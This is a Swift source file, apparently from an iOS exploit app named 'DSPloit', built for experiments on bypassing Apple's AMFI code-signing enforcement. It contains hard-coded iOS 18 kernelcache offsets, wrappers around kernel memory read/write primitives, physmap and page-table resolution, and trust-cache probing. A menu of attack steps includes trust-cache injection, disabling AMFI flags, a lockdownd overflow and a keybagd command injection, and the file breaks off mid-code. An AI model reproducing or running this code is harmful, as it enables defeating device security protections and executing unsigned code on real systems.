//
//  AMFIExperimentView.swift
//  DSPloit
//
//  AMFI Bypass Experiments — test binary execution from root context
//  Goal: find a way to execute unsigned binaries
//
//  NOTE: Experiments 1-53 removed (legacy probes). Only keeping 54-59 (active research).
//

import SwiftUI
import IOSurface

// MARK: - Physmap constants (saved when Exp 74 verifies)

private enum PhysmapConstants {
    private static let gVirtKey = "dsploit.physmap.gVirtBase"
    private static let gPhysKey = "dsploit.physmap.gPhysBase"
    private static let verifiedKey = "dsploit.physmap.verified"

    static let defaultGPhysBase: UInt64 = 0x800000000

    /// From kernelcache.release.iphone11b.decompressed (iOS 18 / A12 fileset, unslid).
    static let unslidTextBase: UInt64 = 0xfffffff007004000
    static let unslidDataBase: UInt64 = 0xfffffff00a0e0000
    static let dataOffsetFromText: UInt64 = 0x30dc000
    static let pplDataOffsetFromData: UInt64 = 0x8000

    static func dataSegmentBase(kernTextBase: UInt64) -> UInt64 {
        kernTextBase &+ dataOffsetFromText
    }

    static func pplDataSegmentBase(kernTextBase: UInt64) -> UInt64 {
        dataSegmentBase(kernTextBase: kernTextBase) &+ pplDataOffsetFromData
    }

    /// `kernel_pmap` global in __DATA (iphone11b kernelcache analyze — adjust per IPSW).
    static let kernelPmapOffsetInData: UInt64 = 0x3525e7

    /// pmap_cs_allow_invalid — ADRP target in kernelcache (iphone11b iOS 18).
    static let pmapCsAllowInvalidOffsetInData: UInt64 = 0x45b8

    /// __DATA slots referenced from AMFI code (analyze_kernelcache.py --trust-cache).
    /// Top slots from `analyze_kernelcache.py --trust-cache` (fast probe only).
    static let trustCacheFastOffsetsInData: [UInt64] = [
        0x3980, 0x3920, 0x3930, 0x2d0, 0x1a4, 0x2770, 0x38e0, 0x45b8,
    ]

    /// DATA globals only — jangan KRW-read simbol fungsi di __TEXT (respring A12).
    static let trustCacheKcacheDataSymbols: [String] = [
        "_trustcache",
    ]

    /// Full list (fallback only, capped at runtime).
    static let trustCacheGlobalOffsetsInData: [UInt64] = [
        0x45b8, 0x3980, 0x2d0, 0x1a4, 0x2770, 0x1f8, 0x48, 0xb4, 0x38e0, 0x68,
        0x24c, 0x2a0, 0x2f8, 0xc8, 0x3920, 0x3930, 0x208, 0x2780, 0x27ad, 0x38,
        0x2828, 0x280e, 0x28, 0x1c8, 0x2838, 0x38c0, 0x38a0, 0x8, 0x1dc, 0x1e8,
        0x1d8, 0x1e4, 0x2860, 0x2788, 0x2798, 0x308, 0x18, 0x2f0, 0x1b8, 0x1e0,
        0x3900, 0x2878, 0x38b0, 0x2898, 0xa0, 0x1310, 0x1320, 0x39b0,
        // High ADRP ref (script lists but skips in pick — still worth probing)
        0xe8, 0x248, 0xf8,
    ]

    /// From kernelcache string table; XPF "base" set may not index these — ChOma names for logging only.
    static let trustCacheXpfSymbols: [String] = [
        "_trustcache",
        "_query_trust_cache",
        "_query_trust_cache_for_rem",
        "_check_cdhash_in_trustcache",
        "_check_trust_cache_runtime_for_uuid",
        "_load_trust_cache",
        "_load_trust_cache_with_type",
        "_pmap_lookup_in_loaded_trust_caches",
        "_pmap_lookup_in_static_trust_cache",
        "trust_cache_init",
        "kernelSymbol.trust_cache",
        "kernelSymbol.query_trust_cache",
    ]

    static func kernelPmapFromGlobal(kernTextBase: UInt64) -> UInt64 {
        let ptr = ds_kreadptr(dataSegmentBase(kernTextBase: kernTextBase) &+ kernelPmapOffsetInData)
        guard ptr != 0, ptr > 0xffffffdc00000000 else { return 0 }
        return ptr
    }

    /// gVirt estimate without reading physmap/DRAM (avoids respring on Exp 74).
    static func gVirtBaseEstimate(ourProc: UInt64) -> (gVirt: UInt64, source: String) {
        if let saved = load() {
            return (saved.gVirtBase, "saved")
        }
        let est = estimateZoneMapBase(ourProc: ourProc)
        if est >= 0xffffffdc00000000 && est < 0xffffffe500000000 {
            return (est & 0xfffffffc00000000, "proc_est (kernelcache)")
        }
        return (0xffffffdcda524000, "kernelcache default (A12)")
    }

    static func save(gVirtBase: UInt64, gPhysBase: UInt64) {
        UserDefaults.standard.set(String(format: "%llx", gVirtBase), forKey: gVirtKey)
        UserDefaults.standard.set(String(format: "%llx", gPhysBase), forKey: gPhysKey)
        UserDefaults.standard.set(true, forKey: verifiedKey)
        clearProbeOK()
    }

    static func load() -> (gVirtBase: UInt64, gPhysBase: UInt64)? {
        guard UserDefaults.standard.bool(forKey: verifiedKey),
              let vStr = UserDefaults.standard.string(forKey: gVirtKey),
              let pStr = UserDefaults.standard.string(forKey: gPhysKey),
              let gVirtBase = UInt64(vStr, radix: 16),
              let gPhysBase = UInt64(pStr, radix: 16) else { return nil }
        return (gVirtBase, gPhysBase)
    }

    static func loadOrDefault() -> (gVirtBase: UInt64, gPhysBase: UInt64) {
        if let saved = load() { return saved }
        let proc = ds_get_our_proc()
        return (estimateZoneMapBase(ourProc: proc), defaultGPhysBase)
    }

    /// Rough zone_map hint from proc (often too high — use scan candidates in Exp 74).
    static func estimateZoneMapBase(ourProc: UInt64) -> UInt64 {
        guard ourProc > 0xffffffd000000000 else { return 0xffffffdcda524000 }
        let block = ourProc & 0xFFFFFFFFF0000000
        return block &- 0x31ADD000
    }

    /// gVirtBase candidates: physmap lives in 0xffffffdc..0xffffffe2, NOT near proc (0xe2+).
    static func gVirtBaseCandidates(ourProc: UInt64, tte: UInt64) -> [(String, UInt64)] {
        var out: [(String, UInt64)] = []
        var seen = Set<UInt64>()

        func add(_ name: String, _ value: UInt64) {
            guard value > 0xffffffdc00000000, seen.insert(value).inserted else { return }
            out.append((name, value))
        }

        if let saved = load()?.gVirtBase { add("saved", saved) }
        add("proc_est", estimateZoneMapBase(ourProc: ourProc))
        add("tte_align_1g", tte & 0xfffffffc00000000)
        add("tte_align_256m", tte & 0xfffffffe00000000)

        var g = UInt64(0xffffffdc00000000)
        while g < 0xffffffe200000000 {
            add("physmap_scan", g)
            g &+= 0x04000000
        }

        return out
    }

    static var isVerified: Bool { UserDefaults.standard.bool(forKey: verifiedKey) }

    private static let probeOKKey = "dsploit.physmap.probeOK"

    static func markProbeOK() {
        UserDefaults.standard.set(true, forKey: probeOKKey)
    }

    static func clearProbeOK() {
        UserDefaults.standard.removeObject(forKey: probeOKKey)
    }

    static var isProbeOK: Bool { UserDefaults.standard.bool(forKey: probeOKKey) }

    static var statusSummary: String {
        if let p = load() {
            return "gVirt=0x\(String(format: "%llx", p.gVirtBase)) gPhys=0x\(String(format: "%llx", p.gPhysBase))"
        }
        return "Jalankan Physmap Verify (Exp 74) dulu"
    }
}

// MARK: - Kernel pmap (for page table walks on kernel VA)

private struct KernelPmapChain {
    let kernProc: UInt64
    let task: UInt64
    let vmMap: UInt64
    let pmap: UInt64
    let tte: UInt64
    let tteField: String
}

/// Kernel/physmap VA (PAC-stripped). iOS 18 pmap may store L1 at +0x00 or +0x08.
private func isKernelOrPhysmapVA(_ v: UInt64) -> Bool {
    if v == 0 { return false }
    if v >= 0xffffff8000000000 { return true }
    if v >= 0xffffffdc00000000 && v < 0xffffffe500000000 { return true }
    // PAC residue (screenshot: 0xfffffe0… before xpaci)
    if (v >> 40) == 0xfffffe || (v >> 40) == 0xffffff { return true }
    return false
}

private func isReasonablePhysTT(_ v: UInt64) -> Bool {
    v >= 0x800000000 && v < 0x1000000000
}

/// Socket KRW must not touch garbage VAs — caused panic: copy_validate_kernel_addr(0xfffffffbffffffff).
private func isSafePhysmapKRWAddress(_ va: UInt64) -> Bool {
    guard va >= 0xffffffdd00000000 && va < 0xffffffe500000000 else { return false }
    if va >= 0xfffffffa00000000 { return false }
    return true
}

private func physmapVA(fromPhysical phys: UInt64, gVirt: UInt64, gPhys: UInt64, offset: UInt64 = 0) -> UInt64? {
    guard isReasonablePhysTT(phys) else { return nil }
    let va = phys &- gPhys &+ gVirt &+ offset
    guard isSafePhysmapKRWAddress(va) else { return nil }
    return va
}

private func safeKread64Physmap(_ va: UInt64) -> UInt64 {
    guard isSafePhysmapKRWAddress(va) else { return 0 }
    return ds_kread64_safe(va)
}

/// Kernel __TEXT / __DATA / fileset aux (0xffffff80… and legacy 0xfffffff0…).
private func isSafeKernelKreadAddress(_ va: UInt64) -> Bool {
    if va >= 0xfffffffa00000000 { return false }
    
    // For iOS 15-18, Kernel text/data is always at 0xfffffff0...
    if va >= 0xfffffff000000000 && va < 0xfffffffc00000000 { return true }
    
    // For older iOS versions, kernel text might be at 0xffffff80...
    // But we MUST exclude 0xffffffdc... to 0xffffffe5... (Zone Map / Physmap)
    // because unmapped reads there cause Kernel Data Abort panics.
    // Also exclude 0xffffff8000000000 boundary region (unmapped, causes panic).
    if va >= 0xffffff8000000000 && va < 0xffffffdc00000000 {
        // Skip the very start of kernel VA space — typically unmapped
        if va < 0xffffff8100000000 { return false }
        return true
    }
    
    return false
}

/// kalloc heap (amfid/proc/trust cache — 0xdd/0xde/0xe0…). Jangan pakai aturan physmap 0xdc–0xe6 di sini.
private func isSafeKernelHeapKreadAddress(_ va: UInt64) -> Bool {
    if va >= 0xfffffffa00000000 { return false }
    // Zone map on iOS 15-18 is typically 0xffffffdc... to 0xffffffe2...
    // DO NOT allow 0xfffffff0... here because it contains MMIO (I/O registers) which causes LLC Bus Error panic if read!
    // Start from 0xffffffdd to explicitly exclude the VM, Metadata, and Bitmaps regions in 0xffffffdc which can trigger Data Abort panics.
    // End at 0xffffffe5 to explicitly exclude Metadata / Bitmaps regions which start at 0xffffffe7...
    let isZoneMap = va >= 0xffffffdd00000000 && va < 0xffffffe500000000
    guard isZoneMap else { return false }
    if let gVirt = PhysmapConstants.load()?.gVirtBase {
        if va >= gVirt, va < gVirt &+ 0x80000000 { return false }
    }
    return true
}

/// __DATA.__ppl_data — KRW read → "Unexpected fault in kernel static region" (A12 PPL).
private func isInPPLDataRegion(_ va: UInt64, kernTextBase: UInt64) -> Bool {
    let ppl = PhysmapConstants.pplDataSegmentBase(kernTextBase: kernTextBase)
    return va >= ppl && va < ppl + 0x100000
}

/// Trust cache runtime object is heap (kalloc), not static __DATA / __ppl_data.
private func isLikelyTrustCacheHeapPointer(_ v: UInt64, kernTextBase: UInt64) -> Bool {
    guard isSafeKernelHeapKreadAddress(v) else { return false }
    return !isInPPLDataRegion(v, kernTextBase: kernTextBase)
}

/// Antara __TEXT utama dan __DATA (komponen fileset lain: AMFI, trustcache, …).
private func isFilesetAuxDataVA(_ va: UInt64, kernTextBase: UInt64, dataSegBase: UInt64) -> Bool {
    guard va >= kernTextBase, va < dataSegBase else { return false }
    return !isInPPLDataRegion(va, kernTextBase: kernTextBase)
}

/// Exp 77: heap, __DATA pre-PPL, atau fileset aux (pointer dari kc+0x3980 dll.).
private func isSafeTrustCacheStructVA(
    _ va: UInt64,
    dataSegBase: UInt64,
    pplDataBase: UInt64,
    kernTextBase: UInt64
) -> Bool {
    if isInPPLDataRegion(va, kernTextBase: kernTextBase) { return false }
    if isSafeKernelHeapKreadAddress(va) { return true }
    if va >= dataSegBase && va < pplDataBase { return true }
    return isFilesetAuxDataVA(va, kernTextBase: kernTextBase, dataSegBase: dataSegBase)
}

/// Pointer dari slot __DATA — ikuti ke heap / __DATA / fileset aux (bukan alamat fungsi di __TEXT).
private func isSafeTrustCacheFollowPointer(
    _ ptr: UInt64,
    dataSegBase: UInt64,
    pplDataBase: UInt64,
    kernTextBase: UInt64
) -> Bool {
    guard isLikelyKernelObjectPointer(ptr) else { return false }
    return isSafeTrustCacheStructVA(ptr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernTextBase)
}

/// Skip integers / flags (e.g. pmap_cs_allow_invalid = 1 at kc+0x45b8).
private func isLikelyKernelObjectPointer(_ v: UInt64) -> Bool {
    if v < 0x100000 { return false }
    return isLikelyKernelPointer(v)
}

/// iOS 18 trust cache entry layout (24 bytes):
///   [0..19]  CDHash (20 bytes, SHA1 atau truncated SHA256)
///   [20]     hashType: 1=SHA1, 2=SHA256-truncated
///   [21]     flags
///   [22..23] padding
///
/// Heuristik: count harus masuk akal (>= 5), dan setidaknya SATU dari
/// beberapa entry pertama harus punya entropy CDHash yang wajar.
private func trustCacheEntriesPlausible(
    hdrVA: UInt64,
    count: UInt32,
    dataSegBase: UInt64,
    pplDataBase: UInt64,
    kernTextBase: UInt64
) -> Bool {
    // count < 5 = false positive (struct lain yang kebetulan lolos ver/count check)
    // count > 200k = tidak masuk akal
    guard count >= 5, count <= 200_000 else { return false }
    let heap = isSafeKernelHeapKreadAddress(hdrVA)
    let r32: (UInt64) -> UInt32 = { heap ? safeKread32Heap($0) : safeKread32Kernel($0) }
    let r64: (UInt64) -> UInt64 = { heap ? safeKread64Heap($0) : safeKread64Kernel($0) }

    // Coba stride 24 dan 32 — iOS 18 pakai salah satu
    for stride: UInt64 in [24, 32] {
        let e0 = hdrVA &+ 8
        guard isSafeTrustCacheStructVA(e0 &+ stride - 1, dataSegBase: dataSegBase,
                                       pplDataBase: pplDataBase, kernTextBase: kernTextBase)
        else { continue }

        // Cek beberapa entry (bukan hanya entry[0]) — entry pertama mungkin metadata
        var entriesWithEntropy = 0
        let checkCount = min(Int(count), 8)

        for i in 0..<checkCount {
            let ef = e0 &+ UInt64(i) * stride
            guard isSafeTrustCacheStructVA(ef &+ 16, dataSegBase: dataSegBase,
                                           pplDataBase: pplDataBase, kernTextBase: kernTextBase)
            else { break }

            let h0 = r64(ef)
            let h1 = r64(ef &+ 8)
            let h2 = r32(ef &+ 16)

            // Semua nol = belum diisi
            if h0 == 0 && h1 == 0 && h2 == 0 { continue }

            // CDHash harus punya entropy: setidaknya beberapa byte non-trivial
            // Longgarkan: cukup 1 dari 3 word punya nilai > 0xFFFF
            let h0entropy = h0 > 0x0000_FFFF
            let h1entropy = h1 > 0x0000_FFFF
            let h2entropy = h2 > 0x00FF
            if h0entropy || h1entropy || h2entropy {
                entriesWithEntropy += 1
            }
        }

        // Minimal 2 entry dari 8 yang dicek harus punya entropy
        // (lebih longgar dari sebelumnya yang butuh 2 dari 3 word per entry)
        if entriesWithEntropy >= 2 {
            return true
        }
    }
    return false
}

private func safeKread64Kernel(_ va: UInt64) -> UInt64 {
    guard isSafeKernelKreadAddress(va) else { return 0 }
    return ds_kread64_safe(va)
}

private func safeKread32Kernel(_ va: UInt64) -> UInt32 {
    guard isSafeKernelKreadAddress(va) else { return 0 }
    return ds_kread32_safe(va)
}

private func safeKread64Heap(_ va: UInt64) -> UInt64 {
    guard isSafeKernelHeapKreadAddress(va) else { return 0 }
    return ds_kread64_safe(va)
}

private func safeKread32Heap(_ va: UInt64) -> UInt32 {
    guard isSafeKernelHeapKreadAddress(va) else { return 0 }
    return ds_kread32_safe(va)
}

private func safeKwrite64Physmap(_ va: UInt64, _ value: UInt64) -> Bool {
    guard isSafePhysmapKRWAddress(va) else { return false }
    ds_kwrite64(va, value)
    return true
}

private func safeKwrite32Physmap(_ va: UInt64, _ value: UInt32) -> Bool {
    guard isSafePhysmapKRWAddress(va) else { return false }
    ds_kwrite32(va, value)
    return true
}

private func safeKwrite16Physmap(_ va: UInt64, _ value: UInt16) -> Bool {
    guard isSafePhysmapKRWAddress(va) else { return false }
    ds_kwrite16(va, value)
    return true
}

private func safeKwrite64Heap(_ va: UInt64, _ value: UInt64) -> Bool {
    guard isSafeKernelHeapKreadAddress(va) else { return false }
    ds_kwrite64(va, value)
    return true
}

private func safeKwrite32Heap(_ va: UInt64, _ value: UInt32) -> Bool {
    guard isSafeKernelHeapKreadAddress(va) else { return false }
    ds_kwrite32(va, value)
    return true
}

private func safeKwrite16Heap(_ va: UInt64, _ value: UInt16) -> Bool {
    guard isSafeKernelHeapKreadAddress(va) else { return false }
    ds_kwrite16(va, value)
    return true
}

private func isLikelyKernelPointer(_ v: UInt64) -> Bool {
    if v == 0 { return false }
    if v >= 0xffffff8000000000 { return true }
    if v >= 0xffffffdc00000000 && v < 0xffffffe600000000 { return true }
    return false
}

/// Score pmap candidates (+0x00 tte, +0x08 ttep — Exp 75 checks +0x08 first).
private func pmapCandidateScore(_ pmap: UInt64) -> Int {
    guard isLikelyKernelPointer(pmap) else { return 0 }
    var score = 1
    let p0 = ds_kreadptr(pmap)
    let p8 = ds_kreadptr(pmap + 8)
    if p0 == pmap { score += 1 } // user pmap quirk; L1 may be at +0x08
    else if isKernelOrPhysmapVA(p0) { score += 4 }
    if isKernelOrPhysmapVA(p8) { score += 5 }
    if isReasonablePhysTT(p8) { score += 4 }
    if isReasonablePhysTT(p0) { score += 3 }
    return score
}

/// Wide scan vm_map + task for pmap (kernel vm_map often ≠ +0x50 only).
private func findPmapPointer(vmMap: UInt64, task: UInt64, detail: inout String) -> UInt64? {
    var best: (addr: UInt64, score: Int, label: String)?

    func consider(_ addr: UInt64, _ label: String) {
        let sc = pmapCandidateScore(addr)
        guard sc >= 3 else { return }
        if best == nil || sc > best!.score {
            best = (addr, sc, label)
        }
    }

    if vmMap != 0 {
        detail += "Scanning vm_map 0x\(String(format: "%llx", vmMap)) for pmap...\n"
        for off in stride(from: UInt64(0), to: 0xC0, by: 8) {
            let p = ds_kreadptr(vmMap + off)
            if isLikelyKernelPointer(p) {
                let sc = pmapCandidateScore(p)
                if sc >= 3 {
                    detail += "  map+0x\(String(format: "%02x", off)): 0x\(String(format: "%llx", p)) score=\(sc)\n"
                    consider(p, "vm_map+0x\(String(format: "%x", off))")
                }
            }
        }
    }

    detail += "Scanning task 0x\(String(format: "%llx", task)) for pmap...\n"
    for off in stride(from: UInt64(0x20), to: 0x98, by: 8) {
        let p = ds_kreadptr(task + off)
        if isLikelyKernelPointer(p) {
            let sc = pmapCandidateScore(p)
            if sc >= 4 {
                detail += "  task+0x\(String(format: "%02x", off)): 0x\(String(format: "%llx", p)) score=\(sc)\n"
                consider(p, "task+0x\(String(format: "%x", off))")
            }
        }
    }

    if let b = best {
        detail += "✅ pmap from \(b.label): 0x\(String(format: "%llx", b.addr)) (score \(b.score))\n\n"
        return b.addr
    }

    if vmMap != 0 {
        detail += "vm_map dump (pmap not found):\n"
        for off in stride(from: UInt64(0), to: 0x60, by: 8) {
            detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", ds_kread64_safe(vmMap + off)))\n"
        }
        detail += "\n"
    }
    return nil
}

/// L1 page table root from pmap (+0x00 tte VA, +0x08 ttep/alt, PAC via ds_kreadptr).
private func resolvePmapL1Root(pmap: UInt64, detail: inout String) -> (va: UInt64, field: String)? {
    detail += "pmap struct dump (ds_kreadptr = PAC stripped):\n"
    var best: (UInt64, String)?
    for off: UInt64 in stride(from: 0, to: 0x40, by: 8) {
        let raw = ds_kread64_safe(pmap + off)
        let ptr = ds_kreadptr(pmap + off)
        let tag: String
        if isKernelOrPhysmapVA(ptr) { tag = " ← L1 VA?" }
        else if isReasonablePhysTT(ptr) { tag = " ← phys?" }
        else { tag = "" }
        detail += "  +0x\(String(format: "%02x", off)): raw=0x\(String(format: "%016llx", raw)) ptr=0x\(String(format: "%016llx", ptr))\(tag)\n"
    }
    detail += "\n"

    // +0x08 first — iOS 18 / Exp 75 often has TTBR at pmap+0x08
    for (off, name) in [(UInt64(8), "+0x08 ttep/alt"), (UInt64(0), "+0x00 tte"), (UInt64(0x10), "+0x10")] {
        let v = ds_kreadptr(pmap + off)
        if v == pmap { continue }
        if isKernelOrPhysmapVA(v) {
            detail += "✅ L1 root from \(name): 0x\(String(format: "%llx", v))\n"
            return (v, name)
        }
    }
    for (off, name) in [(UInt64(8), "+0x08"), (UInt64(0), "+0x00")] {
        let v = ds_kreadptr(pmap + off)
        if isReasonablePhysTT(v) {
            detail += "⚠️ Physical L1 at \(name): 0x\(String(format: "%llx", v)) (need gVirtBase to map)\n"
            if best == nil { best = (v, "\(name) phys") }
        }
    }
    if let b = best { return (b.0, b.1) }
    detail += "❌ No valid L1 at pmap+0x00/+0x08 (user pmap often has tte=0 — try kernproc pmap)\n"
    return nil
}

/// Exp 74 verify — NO brute-force physmap KRW scan (caused panic at 0xfffffffbffffffff).
@discardableResult
private func verifyPhysmapSafe(
    kernBase: UInt64,
    kernMagic: UInt64,
    ourProc: UInt64,
    tte: UInt64,
    detail: inout String
) -> (gVirtBase: UInt64, gPhysBase: UInt64)? {
    let gPhysBase = PhysmapConstants.defaultGPhysBase

    detail += "=== Physmap verify (minimal KRW — no zone/DRAM read) ===\n"
    detail += "Menghindari respring: tidak baca physmap/DRAM/pmap (hanya __TEXT + estimasi).\n\n"

    guard (kernMagic & 0xFFFFFFFF) == 0xFEEDFACF else {
        detail += "❌ KRW tidak bisa baca kernel __TEXT (Mach-O)\n"
        return nil
    }
    detail += "✅ KRW reads kernel __TEXT at 0x\(String(format: "%llx", kernBase))\n"

    var (gVirt, source) = PhysmapConstants.gVirtBaseEstimate(ourProc: ourProc)

    if tte != 0, isKernelOrPhysmapVA(tte), source != "saved" {
        let aligned = tte & 0xfffffffc00000000
        if aligned >= 0xffffffdc00000000 && aligned < 0xffffffe500000000 {
            let ttep = tte &- aligned &+ gPhysBase
            if ttep >= 0x800000000 && ttep < 0x900000000 {
                gVirt = aligned
                source = "tte_align (offline hint)"
            }
        }
    }

    detail += "gVirtBase: 0x\(String(format: "%llx", gVirt)) (\(source))\n"
    detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n"
    detail += "(DRAM/physmap KRW probe disabled — caused respring on some boots)\n"

    detail += "\n🎉 PHYSMAP CONSTANTS SET\n"
    detail += "physmap_slide = 0x\(String(format: "%llx", gVirt &- gPhysBase))\n"
    detail += "→ Lanjut ② Trust Cache Probe\n\n"
    PhysmapConstants.save(gVirtBase: gVirt, gPhysBase: gPhysBase)
    return (gVirt, gPhysBase)
}

/// Page table root for kernel virtual addresses — must use kernproc, not our_proc.
private func resolveKernelPmapChain(detail: inout String) -> KernelPmapChain? {
    let kernProc = ds_get_kern_proc()
    guard kernProc != 0 else {
        detail += "❌ ds_get_kern_proc() failed (check offsets / kernproc symbol)\n"
        return nil
    }
    detail += "kernproc: 0x\(String(format: "%llx", kernProc))\n"

    let task = taskbyproc(kernProc)
    guard task != 0 else {
        detail += "❌ taskbyproc(kernproc) failed\n"
        return nil
    }
    detail += "kernel task: 0x\(String(format: "%llx", task))\n"

    var vmMap = task_get_vm_map(task)
    if vmMap == 0 {
        for off: UInt64 in [0x28, 0x30, 0x20, 0x38, 0x40] {
            let c = ds_kread64_safe(task + off)
            if c > 0xffffffdc00000000 && c < 0xffffffe500000000 {
                let fwd = ds_kread64_safe(c + 0x10)
                if fwd != 0 {
                    vmMap = c
                    detail += "kernel vm_map (scan +0x\(String(format: "%x", off))): 0x\(String(format: "%llx", c))\n"
                    break
                }
            }
        }
    } else {
        detail += "kernel vm_map (off_task_map): 0x\(String(format: "%llx", vmMap))\n"
    }

    var pmap: UInt64 = 0
    let kernBase = ds_get_kernel_base()
    let globalPmap = PhysmapConstants.kernelPmapFromGlobal(kernTextBase: kernBase)
    if globalPmap != 0 {
        pmap = globalPmap
        detail += "kernel_pmap (kernelcache __DATA+0x\(String(format: "%x", PhysmapConstants.kernelPmapOffsetInData))): 0x\(String(format: "%llx", pmap))\n"
    }

    if pmap == 0 {
        guard vmMap != 0 else {
            detail += "❌ kernel vm_map not found\n"
            return nil
        }
        guard let found = findPmapPointer(vmMap: vmMap, task: task, detail: &detail) else {
            detail += "❌ kernel pmap not found (wide scan vm_map+task)\n"
            return nil
        }
        pmap = found
    }

    guard let l1 = resolvePmapL1Root(pmap: pmap, detail: &detail) else {
        return nil
    }

    var l1VA = l1.va
    var field = l1.field
    if !isKernelOrPhysmapVA(l1VA), isReasonablePhysTT(l1VA), let saved = PhysmapConstants.load() {
        l1VA = l1VA &- saved.gPhysBase &+ saved.gVirtBase
        field = "\(l1.field) → physmap VA"
        detail += "Converted phys L1 → physmap VA: 0x\(String(format: "%llx", l1VA))\n"
    }

    guard isKernelOrPhysmapVA(l1VA) else {
        detail += "❌ kernel L1 not usable (tte=0 at +0x00 — run Exp 74 brute scan first)\n"
        return nil
    }
    detail += "kernel L1 (\(field)): 0x\(String(format: "%llx", l1VA))\n\n"

    return KernelPmapChain(kernProc: kernProc, task: task, vmMap: vmMap, pmap: pmap, tte: l1VA, tteField: field)
}

struct AMFIExperimentView: View {
    @ObservedObject private var root = RootExecutor.shared
    @ObservedObject private var mgr = dspmgr.shared
    
    @State private var results: [ExperimentResult] = []
    @State private var isRunning = false
    @State private var runningLabel = ""
    @State private var customBinary = "/usr/bin/id"
    // Exp 79: simpan hasil probe untuk dipakai inject
    @State private var probedTCAddr: UInt64 = 0
    @State private var probedTCCount: UInt32 = 0
    @State private var probedTCStride: UInt32 = 24

    struct ExperimentResult: Identifiable {
        let id = UUID()
        let name: String
        let success: Bool
        let detail: String
        let timestamp: Date
    }
    
    var body: some View {
        List {
            // Status Banner
            if isRunning {
                Section {
                    HStack(spacing: 10) {
                        ProgressView()
                            .tint(.red)
                        VStack(alignment: .leading, spacing: 2) {
                            Text("Running: \(runningLabel)")
                                .font(.caption.bold())
                                .foregroundStyle(.red)
                            Text("Do NOT close app — will cause panic!")
                                .font(.system(size: 9))
                                .foregroundStyle(.orange)
                        }
                    }
                    .padding(.vertical, 4)
                }
            }
            
            // Jailbreak path (sequential — after Exp 74 success)
            Section {
                Text(PhysmapConstants.statusSummary)
                    .font(.system(size: 10, design: .monospaced))
                    .foregroundStyle(PhysmapConstants.isVerified ? .green : .orange)

                pathButton(
                    title: "① Physmap Verify (Exp 74)",
                    icon: "map.fill",
                    color: .cyan,
                    label: "Physmap",
                    action: runExp74,
                    needsVerified: false
                )

                pathButton(
                    title: "② Trust Cache Probe (Exp 77 read-only)",
                    icon: "magnifyingglass.circle.fill",
                    color: .mint,
                    label: "TC Probe",
                    action: runExp77Probe,
                    needsVerified: true
                )

                pathButton(
                    title: "③ KTRR Analysis (Exp 79 — info only)",
                    icon: "lock.shield.fill",
                    color: .yellow,
                    label: "KTRR",
                    action: runExp79WriteTest,
                    needsVerified: true,
                    needsProbe: true
                )

                pathButton(
                    title: "③b RC Trust Cache Add (Exp 80)",
                    icon: "key.fill",
                    color: .orange,
                    label: "RC TC Add",
                    action: runExp80RCTrustCacheAdd,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③c Heap TC Analysis (Exp 81)",
                    icon: "doc.text.magnifyingglass",
                    color: .pink,
                    label: "Heap TC",
                    action: runExp81HeapTCAnalysis,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③d Deep TC Scan (Exp 82)",
                    icon: "memorychip",
                    color: .cyan,
                    label: "Deep TC",
                    action: runExp82DeepTCScan,
                    needsVerified: true,
                    needsProbe: false
                )












                pathButton(
                    title: "③o2 AMFI Flag Disable (Exp 93b)",
                    icon: "shield.slash.fill",
                    color: .red,
                    label: "AMFI Disable",
                    action: runExp93bAMFIFlagDisable,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③o3 AMFI Verified Spawn (Exp 93c)",
                    icon: "checkmark.shield.fill",
                    color: .red,
                    label: "AMFI Verify",
                    action: runExp93cVerifiedSpawn,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③o4 Custom Payload (Exp 93d)",
                    icon: "hammer.fill",
                    color: .red,
                    label: "Custom Exec",
                    action: runExp93dCustomPayload,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "③o5 File Payload (Exp 93e)",
                    icon: "doc.badge.gearshape",
                    color: .red,
                    label: "File Payload",
                    action: runExp93eFilePayload,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "③o6 Spawn Test (Exp 93f)",
                    icon: "play.circle.fill",
                    color: .red,
                    label: "Spawn Test",
                    action: runExp93fSpawnTest,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③o7 Multi Spawn (Exp 93g)",
                    icon: "arrow.triangle.2.circlepath",
                    color: .red,
                    label: "Multi Spawn",
                    action: runExp93gMultiSpawn,
                    needsVerified: true,
                    needsProbe: false
                )






                pathButton(
                    title: "③v TC Load XPC via SB (Exp 100)",
                    icon: "arrow.down.circle.fill",
                    color: .green,
                    label: "TC Load",
                    action: runExp100TCLoadXPC,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "③w cryptexd TOCTOU Race (Exp 101)",
                    icon: "bolt.trianglebadge.exclamationmark.fill",
                    color: .red,
                    label: "TOCTOU",
                    action: runExp101CryptexdTOCTOU,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "③x xpcproxy Sandbox Ext (Exp 102)",
                    icon: "shield.lefthalf.filled.slash",
                    color: .purple,
                    label: "SBX Ext",
                    action: runExp102XpcproxySandbox,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "③y installd Deserialization (Exp 103)",
                    icon: "doc.zipper",
                    color: .orange,
                    label: "Deserial",
                    action: runExp103InstalldDeserial,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "③z lockdownd strcpy Overflow (Exp 104)",
                    icon: "exclamationmark.triangle.fill",
                    color: .red,
                    label: "Overflow",
                    action: runExp104LockdowndOverflow,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "④a MobileStorageMounter XPC (Exp 105)",
                    icon: "externaldrive.badge.plus",
                    color: .green,
                    label: "MSM XPC",
                    action: runExp105MSMXPC,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "④b Sandbox Exec Spawn (Exp 106)",
                    icon: "play.circle.fill",
                    color: .mint,
                    label: "SBX Spawn",
                    action: runExp106SandboxExecSpawn,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "⑤ keybagd Command Inject (Exp 107)",
                    icon: "terminal.fill",
                    color: .red,
                    label: "keybagd",
